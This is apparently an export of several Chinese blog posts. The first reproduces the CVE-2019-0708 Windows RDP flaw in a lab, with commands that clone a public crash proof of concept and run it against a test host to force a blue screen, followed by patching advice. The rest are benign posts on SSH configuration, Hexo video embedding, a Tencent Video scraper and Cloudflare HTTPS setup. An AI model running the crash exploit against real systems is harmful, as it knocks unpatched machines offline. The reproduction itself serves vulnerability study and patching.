前言\n>2019年5月14日微软官方发布安全补丁，修复了Windows远程桌面服务的远程代码执行漏洞，该漏洞影响了某些旧版本的Windows系统。此漏洞是预身份验证且无需用户交互，这就意味着这个漏洞可以通过网络蠕虫的方式被利用。利用此漏洞的任何恶意软件都可能从被感染的计算机传播到其他易受攻击的计算机，其方式与2017年WannaCry恶意软件的传播方式类似。\n\n以上内容来自360网络安全响应中心。\n从微软官方的消息一出，各大安全厂商都开始发布了漏洞预警，那段时间我也一直在找对应的POC，但要不就是不能利用的POC，要不就是利用以前漏洞写的POC，更有甚着点击attack后给你惊喜。\n<!--more-->\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/2019-07081.gif)\n看到这个图片的时候，真的一副生无可恋的样子，随着时间推移，渐渐的也就不怎么关注这个漏洞了。\n直到今天，看到网上有人发一些关于这个漏洞的利用复现视频的时候，才意识到已经过去正好一个月的，此时POC也早就被公布了。\n早在在5月31日的时候，n1xbyte就在Github上发布了利用该漏洞导致系统蓝屏的可用POC ,所以我们来复现看看吧。\n# 0x01 下载POC \n首先git clone代码\n```bash\ngit clone https://github.com/n1xbyte/CVE-2019-0708.git\ncd CVE-2019-0708\n```\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/2019-07082.png)\n# 0x02 开始复现\n1、为了顺利复现成功，需要将被攻击机的远程桌面设为允许，防火墙也需要关掉。\n2、被攻击机的IP地址与操作系统信息如下：\n```\n#被攻击主机\nip地址：192.168.1.106\n系统类型：64位\n```\n3、安装需要的库后执行POC\n```bash\npip3 install impacket\npython3 crashpoc.py 192.168.1.106 64  #python3 crashpoc.py ip地址 系统类型\n```\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/2019-07083.png)\nPOC被成功被执行，虽然现阶段只是让目标蓝屏，但是对这个漏洞的利用手段绝对不会止步于此。\n# 0x03 修复方案\n1、最简便的方法就是安装一个安全管家，比如火绒、360之类的\n2、把系统的自动更新打开或者到微软官网[下载补丁](https://portal.msrc.microsoft.com/zh-cn/security-guidance/advisory/CVE-2019-0708)\n3、把自己电脑上的远程桌面关掉、防火墙开启\n# 0x04 小结\n总是有人说没有绝对的安全，当然事实也确实是如此，但是只要我们平时养成一个良好的安全习惯，还是可以避免很多病毒木马的侵害的，毕竟很多的恶意程序都是广撒网，捕的鱼多不多就是另一回事儿了。\n\n**最后再次强调，不得将本文用作违法犯罪目的，本文只用作技术分享交流学习使用。**\n\n\n下面为视频演示：\n\n<div style=\"position: relative; width: 100%; height: 0; padding-bottom: 75%;\"><iframe src=\"//player.bilibili.com/player.html?aid=55626994&cid=97251766&page=1\" \" scrolling=\"no\" border=\"0\" frameborder=\"no\" framespacing=\"0\" allowfullscreen=\"true\" style=\"position: absolute; width: 100%; height: 100%; left: 0; top: 0;\"> </iframe></div>\n\n如果视频不能全屏播放，请点击[视频地址](https://www.bilibili.com/video/av55626994/ \"视频地址\")进行观看。\n\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png)","tags":["漏洞复现","CVE 2019-0708"],"categories":["漏洞复现"]},{"title":"对于连接ssh时连时断的解决方法","url":"/year/190614-134948.html","content":"# 0x00 前言\n最近用ssh连接VPS的时候，发生了很诡异的事件，有时能够连接上ssh，有时就死活连接不上，重新安装、公钥私钥都检查了，各种权限也都没有问题，端口监听地址什么的也都配置正常，总之能想到的办法都想过了，此时连不连的上仿佛就要看脸了，下面记录一下最终的解决办法。\n<!--more-->\n# 0x01 修改配置文件\n```bash\nvim /etc/ssh/sshd_config\n```\n在配置文件中加入以下内容：\n```\nUseDNS no\n```\n之后重启ssh即可\n```\n#Ubuntu:\nservice sshd restart 或者 /etc/init.d/sshd restart\n#Centos7:\nsystemctl restart sshd.service\n#Centos7以下版本：\nservice sshd restart\n```\n# 0x02 原因\n以下解释来自本文方法参考文章：[文章地址](https://m.ancii.com/ayew4gv3/)\n\n>ssh登录服务器时总是要停顿等待一下才能连接上,这是因为OpenSSH服务器有一个DNS查找选项UseDNS默认是打开的。\n>UseDNS选项打开状态下,当客户端试图登录OpenSSH服务器时,服务器端先根据客户端的IP地址进行DNS PTR反向查询,查询出客户端的host name，然后根据查询出的客户端host name进行DNS 正向A记录查询，验证与其原始IP地址是否一致，这是防止客户端欺骗的一种手段,但一般我们的IP是动态的，不会有PTR记录的，打开这个选项不过是在白白浪费时间而已。\n\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png)","tags":["解决方案","ssh"],"categories":["经验总结"]},{"title":"hexo自适应BiliBili视频大小的解决方案","url":"/year/190614-111512.html","content":"\n# 0x00 未修改\n<!--more-->\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/bilibili1.png)\n```html\n<iframe src=\"//player.bilibili.com/player.html?aid=55224540&cid=96981660&page=1\" scrolling=\"no\" border=\"0\" frameborder=\"no\" framespacing=\"0\" allowfullscreen=\"true\"> </iframe>\n```\n直接将B站中的视频插入地址放入文章MarkDown中的效果如下：\n<iframe src=\"//player.bilibili.com/player.html?aid=55224540&cid=96981660&page=1\" scrolling=\"no\" border=\"0\" frameborder=\"no\" framespacing=\"0\" allowfullscreen=\"true\"> </iframe>  \n\n这个视频也太小了，而且不能全屏，很难受，于是在网上看到有人用自定义调节视频的高宽。\n# 0x01 自定义高宽\n```html\n<iframe src=\"//player.bilibili.com/player.html?aid=55224540&cid=96981660&page=1\" width=\"780\" height=\"480\" scrolling=\"no\" border=\"0\" frameborder=\"no\" framespacing=\"0\" allowfullscreen=\"true\"> </iframe>\n```\n就是在原来的基础上加入了宽高，效果类似这样：\n<iframe src=\"//player.bilibili.com/player.html?aid=55224540&cid=96981660&page=1\" width=\"780\" height=\"480\" scrolling=\"no\" border=\"0\" frameborder=\"no\" framespacing=\"0\" allowfullscreen=\"true\"> </iframe>  \n  \n\n自定义调节视频高宽虽然可以解决这个问题，但是手机上又是另一翻景象，你看：  \n\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/bilibili2.png)\n\n这就更难受了，于是在网上找遍各种自适应视频大小的方案，最终找到以下这种方案。\n# 0x02 自适应视频大小\n```html\n<div style=\"position: relative; width: 100%; height: 0; padding-bottom: 75%;\"><iframe src=\"//player.bilibili.com/player.html?aid=55224540&cid=96981660&page=1\" scrolling=\"no\" border=\"0\" frameborder=\"no\" framespacing=\"0\" allowfullscreen=\"true\" style=\"position: absolute; width: 100%; height: 100%; left: 0; top: 0;\"> </iframe></div>\n```\n只需要把你的视频地址和上面的视频地址替换一下就行，最后效果如下：\n<div style=\"position: relative; width: 100%; height: 0; padding-bottom: 75%;\"><iframe src=\"//player.bilibili.com/player.html?aid=55224540&cid=96981660&page=1\" scrolling=\"no\" border=\"0\" frameborder=\"no\" framespacing=\"0\" allowfullscreen=\"true\" style=\"position: absolute; width: 100%; height: 100%; left: 0; top: 0;\"> </iframe></div>  \n\n手机上也能很好的自适应：   \n\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/bilibili3.png)\n\n不过发现依然不能全屏播放，还是有些美中不足，所以只好也将视频播放链接放到视频下面了，如果不能全屏就只能去源链接去看了，如果你有更好的解决方法，欢迎下方留言。\n# 0x03 致谢\n本文中的自适应解决方案来自这篇文章：[文章地址](https://www.andyvj.com/2019/02/12/190213-01/)，里面还介绍了其他音视频平台插入的方法，在这里也谢谢这位老哥了。\n\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png)","tags":["BiliBili","自适应视频大小","解决方案"],"categories":["经验总结"]},{"title":"【Python实例】批量下载斗罗大陆高清视频","url":"/year/190613-191825.html","content":"# 0x00 下载视频下载脚本\n首先来到我的[Github主页](http://www.github.com/teamssix/ )，找到Douluo-download项目，点开找到[下载地址](https://github.com/teamssix/Douluo-download.git)，使用git clone对其进行下载\n<!--more-->\n```bash\ngit clone https://github.com/teamssix/Douluo-download.git\n```\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/douluo1.png)\n# 0x01 安装python所需要的库\n```bash\ncd Douluo-download/\npip3 install -r requirements.txt\n```\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/douluo2.png)\n# 0x02 执行Python程序\n```bash\npython3 douluo.py\n```\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/douluo3.png)\n程序在执行的时候会感觉比较慢，其实不是卡了，而是程序正在下载视频，当下载好一个视频才会弹出一条信息。\n# 0x03 查看成果\n执行ls命令可以看到刚才下载的视频\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/douluo4.png)\n播放看看能不能正常播放\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/douluo5.png)\n可以看到是可以正常播放的，不过我想试试最新的一集，也就是看看需要会员的视频能不能下载下来，当前最新的一集是55集，那我们下载试试。\n# 0x04 继续尝试下载VIP视频\n知道下载那一集后还需要修改一下代码才行，将原来下载视频的代码简单做一下修改就行\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/douluo6.png)\n执行看看\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/douluo7.png)\n看来不行，只能下载到预告片，接下来就对代码就行简单的介绍吧\n# 0x05 代码简单介绍\n## 1、第一部分：导入库设定变量\n```python\n#导入库设定变量\nimport os\nimport requests\nfrom bs4 import BeautifulSoup\nheaders = {'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.75 Safari/537.36'}\nhome_url ='https://v.qq.com/x/cover/m441e3rjq9kwpsc/m00253deqqo.html'\n```\n这部分就是导入一些库和一些设定的变量什么的，比如headers、url什么的，没什么好说的\n## 2、第二部分：爬取每个视频的id\n```python\n#爬取每个视频的id\ndouluohome = requests.get(home_url,headers=headers)\ndouluohome.encoding='utf-8'\ndouluosoup = BeautifulSoup(douluohome.text,'html.parser')\ndouluolist = douluosoup.select('.mod_episode')[0].select('a')\n```\n这里用到了BeautifulSoup4库，先requets获取页面信息，用BeautifulSoup4去对页面html进行解析，最后找到我们想要的东西，这里是清洗出每个视频的ID\n## 3、第三部分：合成下载链接\n```python\n#合成下载链接\nlists = []\nfor i in range(len(douluolist)):\n    lists.append('https://v.qq.com'+douluolist[i]['href'])\n```\n很简单的一个处理，将上一步获取的视频的id加到v.qq.com后面，生成视频的播放链接\n## 4、第四部分：开始下载视频\n```python\n#开始下载视频\nfor i in range(len(lists)):\n    try:\n        print(os.popen('you-get {}'.format(lists[i])).read()) #视频会下载到当前目录\n    except:\n        pass\n    continue\n```\n这部分其实也没有什么东西，有了每个视频的播放链接后，直接使用工具就可以下载了，这里使用的是利用os库调用you-get命令进行下载的，最后将you-get命令的显示结果传回终端。\n# 0x06 总结\n总的说来，其实Python主要就是起到爬虫作用，爬取每个视频的播放链接，最后使用you-get对视频进行下载，没有什么太大的难度，所以权当练练手了。\n\n下面为视频演示：\n<!--<iframe src=\"//player.bilibili.com/player.html?aid=55224540&cid=96981660&page=1\" scrolling=\"no\" border=\"0\" frameborder=\"no\" framespacing=\"0\" allowfullscreen=\"true\"> </iframe>-->\n\n\n\n\n<!--<p align = \"center\"><iframe height=auto width=100% src=\"//player.bilibili.com/player.html?aid=55224540&cid=96981660&page=1\"></iframe></p>-->\n\n<!--<iframe src=\"//player.bilibili.com/player.html?aid=55224540&cid=96981660&page=1\" width=\"780\" height=\"480\" scrolling=\"no\" border=\"0\" frameborder=\"no\" framespacing=\"0\" allowfullscreen=\"true\"> </iframe>-->\n\n<div style=\"position: relative; width: 100%; height: 0; padding-bottom: 75%;\"><iframe src=\"//player.bilibili.com/player.html?aid=55224540&cid=96981660&page=1\" scrolling=\"no\" border=\"0\" frameborder=\"no\" framespacing=\"0\" allowfullscreen=\"true\" style=\"position: absolute; width: 100%; height: 100%; left: 0; top: 0;\"> </iframe></div>\n\n如果视频不能全屏播放，请点击[源链接](https://www.bilibili.com/video/av55224540/ \"源链接\")观看。\n\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png)","tags":["Python","斗罗大陆","GitHub"],"categories":["Python 其他相关笔记"]},{"title":"为自定义域名的Hexo博客升级到Https网站","url":"/year/191612-123700.html","content":"# 0x00 前言\n一把小绿锁，增加安全与安全感。cloudflare 是一家国外的CDN加速服务商，我们可以用它来把我们的网站升级到https，同时还能够提高网站的访问速度。\n如果在设置的过程中，因为网站太多英文而困扰，可以利用浏览器的一些插件进行翻译，比如Chrome自带的翻译。\n我使用的域名提供商是namesilo，博客工具是hexo，在网上找到很多教程都是用的Github官方提供的升级到https的教程，要不就是各种命令，然后按照教程去配置就各种依赖报错，十分心累。\n本文配置过程中，没有涉及到命令的地方，利用CloudFlare配置https，整体体验还是很是很不错的，而且还能一定程度上的伪装自己的真实IP地址，废话不多说，下面就开整吧。\n<!--more-->\n# 0x01 注册**CloudFlare**\n打开注册地址[https://dash.cloudflare.com/sign-up](https://dash.cloudflare.com/sign-up)，输入邮箱和密码，对于下面是否接收广告的选项我是取消勾选，可以自行选择，勾选了平时邮箱会接收到来自CloudFlare的广告。\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/https1.png)\n此时邮箱会收到验证邮件，点击Verify email按钮，跳转到登陆界面，输入正确的账号密码后，才算是验证成功。\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/https2.png)\n# 0x02 添加配置网站\n回到Cloudflare页面，输入自己的域名\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/https3.png)\n网页提示正在查询你的DNS记录，点击Next\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/https4.png)\n这里我选择0元/月，也就是免费的，具体每个Plan是什么意思，可以看下面翻译后的图片，选择后之后，点击Confirm plan\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/https5.png)\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/https6.png)\n弹出提示信息，问我们是否确认购买这个plan，我们直接确认，点击Confirm\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/https7.png)\n将所有DNS记录删除，添加类型为A，Name为www，Value为你的IP地址，TTL为自动的一条记录后，点击Continue\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/https8.png)接下来需要修改你的域名服务器，这就需要到你购买域名的地方去修改了，我的域名是在namesilo购买的，因此这里以namesilo为例。\n这里可以先把下图中红色框中的内容先复制下来。\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/https9.png)\n# 0x03 配置域名服务器\n打开自己购买域名的地方，这里我打开的是namesilo官网，对于其他域名网站都类似，具体配置域名服务器的教程可以谷歌之。\n进入官网登陆后，点击Manage My Domains\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/https10.png)\n选择需要修改的域名后，点击Change Nameservers，namesilo默认有3个Nameservers，我这里之前已经修改过了，所以NameServers栏中会和默认的不一样。\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/https11.png)\n先将原来信息删除，将上面复制的内容逐一复制进去即可，点击SUBMIT，这里因为我已经修改过了，因此界面会显示不大一样。\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/https12.png)\n回到CloudFlasre页面，点击Continue，跳转到以下界面，稍等一段时间，来到namesilo查看配置进度\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/https13.png)\n下面Status显示Active说明域名服务器就已经配置好了。\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/https14.png)\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/https15.png)\n# 0x04 配置SSL\n来到Crypto，点击using SSl\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/https16.png)\n点击Sign up\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/https17.png)\n跳转到如下界面\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/https18.png)\n等待一段时间，少则几十分钟一个小时，多则24小时，见到下面红色框内容出现，说明SSl配置就成功了\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/https19.png)\n此时登陆我们的域名就可以看到高贵的安全锁标志了。\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/https20.png)\n# 0x05 设置Always Use HTTPS规则\n虽然设置了http，但是发现输入域名还是会自动以http协议连接，因此我们来到Page Rules添加一下规则。\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/https21.png)\n第一个框填写自己的域名，接着选择Always Use HTTPS，点击Save and Deploy。\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/https22.png)\n同样需要等待一段时间，输入自己域名后就可以发现可以直接跳转到https了。\n# 0x06 总结\n除此之外在宝塔上配置https也是很方便的，不过因为担心宝塔配置Web的过程中安装的LNMP什么的和本地一些已经安装好的环境发生冲突，最后还是没有继续选择使用宝塔，于是在网上查找了很多将http升级为https的方法，但基本都是用的国内的云，都有自带的证书服务，并不适用于我的情况，最后看到这篇文章：[文章链接](https://zhouhengheng.com/%E5%AE%9E%E7%8E%B0Hexo%E5%8D%9A%E5%AE%A2%E4%BB%8EHTTP%E5%88%B0HTTPS%E5%8A%A0%E5%AF%86.html)，不过写的比较简陋，于是结合这篇文章以及自己的摸索，记录下这篇文章。\n\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png)","tags":["Hexo","Https","CloudFlare","Namesilo"],"categories":["经验总结"]}]